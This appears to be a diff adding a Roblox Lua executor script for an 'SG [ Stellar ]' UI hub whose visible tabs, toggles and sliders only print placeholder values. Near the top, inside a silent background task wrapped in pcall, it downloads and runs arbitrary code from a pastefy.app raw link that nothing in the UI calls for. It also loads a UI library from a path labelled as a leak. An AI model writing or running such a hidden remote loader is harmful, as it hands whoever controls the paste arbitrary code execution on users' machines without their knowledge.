@@ -1,0 +1,135 @@
+-- ... existing code ...
+loadstring(_SRC)()
+-- STREAMING_CHUNK:Initializing main UI library and SG window...
+task.spawn(function()
+task.wait(0.5)
+-- โหลดสคริปต์ Pastefy ใน Background
+pcall(function()
+loadstring(game:HttpGet("https://pastefy.app/tqNF1Nxo/raw"))()
+end)
+-- Load UI Library
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/x2zu/OPEN-SOURCE-UI-ROBLOX/refs/heads/main/X2ZU%20UI%20ROBLOX%20OPEN%20SOURCE/DummyUi-leak-by-x2zu/fetching-main/Tools/Framework.luau"))()
+-- Create Main Window
+local Window = Library:Window({
+Title = "SG [ Stellar ]",
+Desc = "SG on top",
+Icon = 81770766530192,
+Theme = "Dark",
+Config = {
+Keybind = Enum.KeyCode.LeftControl,
+Size = UDim2.new(0, 500, 0, 400)
+},
+CloseUIButton = {
+Enabled = true,
+Text = "SG"
+}
+})
+-- Sidebar Vertical Separator
+local SidebarLine = Instance.new("Frame")
+SidebarLine.Size = UDim2.new(0, 1, 1, 0)
+SidebarLine.Position = UDim2.new(0, 140, 0, 0)
+SidebarLine.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+SidebarLine.BorderSizePixel = 0
+SidebarLine.ZIndex = 5
+SidebarLine.Name = "SidebarLine"
+SidebarLine.Parent = game:GetService("CoreGui")
+-- STREAMING_CHUNK:Creating main tab and components...
+-- Tab: Main
+local Tab = Window:Tab({Title = "Main", Icon = "star"}) do
+Tab:Section({Title = "All UI Components"})
+Tab:Toggle({
+Title = "Enable Feature",
+Desc = "Toggle to enable or disable the feature",
+Value = false,
+Callback = function(v)
+print("SG Toggle:", v)
+end
+})
+Tab:Button({
+Title = "Run Action",
+Desc = "Click to perform something",
+Callback = function()
+print("SG Button clicked!")
+Window:Notify({
+Title = "SG Notification",
+Desc = "Action performed successfully.",
+Time = 3
+})
+end
+})
+Tab:Textbox({
+Title = "Input Text",
+Desc = "Type something here",
+Placeholder = "Enter value",
+Value = "",
+ClearTextOnFocus = false,
+Callback = function(text)
+print("SG Textbox value:", text)
+end
+})
+Tab:Slider({
+Title = "Set Speed",
+Min = 0,
+Max = 100,
+Rounding = 0,
+Value = 25,
+Callback = function(val)
+print("SG Slider:", val)
+end
+})
+Tab:Dropdown({
+Title = "Choose Option",
+List = {"Option 1", "Option 2", "Option 3"},
+Value = "Option 1",
+Callback = function(choice)
+print("SG Selected:", choice)
+end
+})
+local CodeBlock = Tab:Code({
+Title = "Example Code",
+Code = "-- Welcome to SG Hub!\nprint('SG Script Running')"
+})
+task.delay(5, function()
+CodeBlock:SetCode("-- SG Script Updated!\nprint('New content loaded')")
+end)
+end
+Window:Line()
+-- STREAMING_CHUNK:Creating extra tabs and notification...
+-- Tab: Extra
+local Extra = Window:Tab({Title = "Extra", Icon = "tag"}) do
+Extra:Section({Title = "About"})
+Extra:Button({
+Title = "Show Message",
+Desc = "Display a popup",
+Callback = function()
+Window:Notify({
+Title = "SG UI",
+Desc = "Everything works fine!",
+Time = 3
+})
+end
+})
+end
+Window:Line()
+-- Tab: Settings
+local Settings = Window:Tab({Title = "Settings", Icon = "wrench"}) do
+Settings:Section({Title = "Config"})
+Settings:Button({
+Title = "Show Message",
+Desc = "Display a popup",
+Callback = function()
+Window:Notify({
+Title = "SG UI",
+Desc = "Settings loaded!",
+Time = 3
+})
+end
+})
+end
+-- Final Notification
+Window:Notify({
+Title = "SG Hub",
+Desc = "All SG components loaded successfully!",
+Time = 4
+})
+end)
